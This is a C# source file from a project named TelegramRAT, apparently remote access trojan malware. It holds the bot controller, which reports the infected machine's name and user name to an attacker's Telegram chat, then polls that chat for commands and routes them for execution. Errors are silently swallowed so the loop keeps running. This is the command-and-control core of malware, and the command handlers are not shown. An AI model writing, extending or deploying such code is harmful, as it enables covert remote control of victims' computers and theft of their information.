namespace TelegramRAT.Core;

using TelegramRAT.Config;
using TelegramRAT.Telegram;

internal sealed class BotController
{
    private readonly BotConfig _config;
    private readonly TelegramClient _client;
    private readonly CommandRouter _router;
    private readonly SessionState _state;
    private bool _running;

    public BotController(BotConfig config)
    {
        _config = config;
        _client = new TelegramClient(config.BotToken);
        _router = new CommandRouter(_client, config);
        _state = new SessionState();
    }

    public async Task StartAsync()
    {
        _running = true;
        long offset = 0;

        await _client.SendTextAsync(_config.AdminChatId,
            $"*Bot Online*\n`{Environment.MachineName}` | `{Environment.UserName}`");

        while (_running)
        {
            try
            {
                var updates = await _client.GetUpdatesAsync(offset);

                foreach (var update in updates)
                {
                    offset = update.UpdateId + 1;

                    if (update.ChatId.ToString() != _config.AdminChatId)
                        continue;

                    var parsed = MessageParser.Parse(update.Text);
                    if (parsed != null)
                    {
                        _state.LastCommand = parsed.Command;
                        _state.LastActivity = DateTime.UtcNow;
                        await _router.RouteAsync(parsed, update.ChatId);
                    }
                }
            }
            catch (Exception ex)
            {
                await Task.Delay(5000);
                _ = ex;
            }

            await Task.Delay(_config.PollInterval);
        }
    }

    public void Stop() => _running = false;
}
